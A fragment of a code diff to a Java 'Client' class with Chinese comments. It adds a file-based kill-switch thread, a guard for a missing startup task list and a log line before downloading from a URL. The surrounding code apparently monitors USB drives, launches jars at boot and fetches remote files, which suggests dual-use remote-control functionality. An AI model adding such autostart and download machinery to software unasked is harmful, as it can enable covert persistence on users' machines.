@@ -24,10 +24,27 @@ public class Client {
 
         //启动U盘检测线程
         CheckU.waitForNotifying();
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (true){
+                    if (new File("D:\\Crash\\xxxxxx").exists())
+                        System.exit(0);
+                    try {
+                        Thread.sleep(500);
+                    } catch (InterruptedException e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+            }
+        }).start();
     }
 
     //启动开机自启jar
     private static void init() {
+        if (!new File(JarPath + "StartUp.txt").exists())
+            return;
         String StartUpTask = FileUtil.readStringFromtxt(JarPath + "StartUp.txt");
         String[] tasks = StartUpTask.split("\n");
         for (String task:tasks){
@@ -135,6 +152,7 @@ public class Client {
             @Override
             public void run() {
                 try {
+                    System.out.println("正在下载: "+link);
                     URL url = new URL(link);
                     URLConnection conn = url.openConnection();
                     InputStream inputStream = new BufferedInputStream(conn.getInputStream());
